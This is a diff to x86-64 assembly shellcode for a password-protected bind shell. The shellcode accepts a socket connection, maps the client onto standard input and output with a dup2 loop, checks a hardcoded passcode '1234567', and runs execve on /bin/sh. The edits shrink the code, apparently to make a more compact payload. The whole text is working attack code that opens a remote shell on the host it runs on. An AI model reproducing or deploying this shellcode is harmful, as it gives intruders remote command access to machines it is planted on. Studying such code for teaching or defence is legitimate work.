@@ -13,7 +13,7 @@ _start:
 	pop rdi
 	push 1
 	pop rsi
-	xor rdx,rdx
+	cdq
 	syscall
 	
 	; copy socket descriptor to rdi for future use 
@@ -58,74 +58,57 @@ _start:
 	pop rax
 	sub rsp, 16
 	mov rsi, rsp
-	mov byte [rsp-1], 16
-	sub rsp, 1
+	push 16
 	mov rdx, rsp
 	syscall
 
-	; store the client socket description 
-	mov r9, rax
-
 	; close parent
-	push 3
-	pop rax
-	syscall
+	;push 3
+	;pop rax
+	;syscall
 
 	; duplicate sockets
 
 	; dup2 (new, old)
-	mov rdi, r9
-	push 33
-	pop rax
-	xor rsi,rsi
-	syscall
-
-	push 33
-	pop rax
-	push 1
+	mov rdi, rax
+	push 3
 	pop rsi
+dup2cycle:
+	mov al, 33
+	dec esi
 	syscall
-
-	push 33
-	pop rax
-	push 2
-	pop rsi
-	syscall
-
-	; Authentication with password "1234567"
+	loopnz dup2cycle
 
 	; read passcode
 	xor rax,rax
 	xor rdi,rdi
 	push rax
-	push rax
 	mov rsi,rsp
-	push 16
+	push 8
 	pop rdx
 	syscall
 
-	; compare the inputted string with "1234567\n"
+	; Authentication with password "1234567"
 	mov rcx,rax
-	mov rdi,rsi
 	mov rbx,0x0a37363534333231
 	push rbx
-	mov rsi,rsp
+	mov rdi,rsp
 	repe cmpsb
 	jnz wrong_pwd
 
 	; execve stack-method
 
-	xor r9,r9
-	push r9 ; NULL register
+	push 59
+	pop rax
+	cdq ; extends rax sign into rdx, zeroing it out
+	push rdx
 	mov rbx, 0x68732f6e69622f2f
 	push rbx
 	mov rdi, rsp
-	push r8
+	push rdx
 	mov rdx, rsp
 	push rdi
 	mov rsi, rsp
-	push 59
-	pop rax
 	syscall
 
 wrong_pwd:
